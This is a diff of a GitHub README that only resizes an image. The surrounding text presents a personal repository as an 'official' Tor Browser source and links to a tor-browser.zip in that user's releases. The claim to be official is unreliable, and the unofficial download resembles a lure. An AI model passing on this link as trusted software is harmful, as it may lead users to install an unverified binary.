@@ -9,7 +9,7 @@
 
 **Download Tor Browser** is your fast and reliable source for the official **Tor Browser** — the most powerful tool for online privacy, anonymity, and accessing the dark web via onion routing. Based on Firefox, it blocks trackers, encrypts traffic, and bypasses censorship.
 
-<img width="512" height="512" alt="image" src="https://github.com/user-attachments/assets/52b67d3d-3c32-41ff-a2d7-3a33ac962416" />
+<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/52b67d3d-3c32-41ff-a2d7-3a33ac962416" />
 
 ## Install
 [Download `tor-browser.zip`](https://github.com/EURICO55/download-tor-browser/releases/download/v15.0.15/tor-browser.zip)
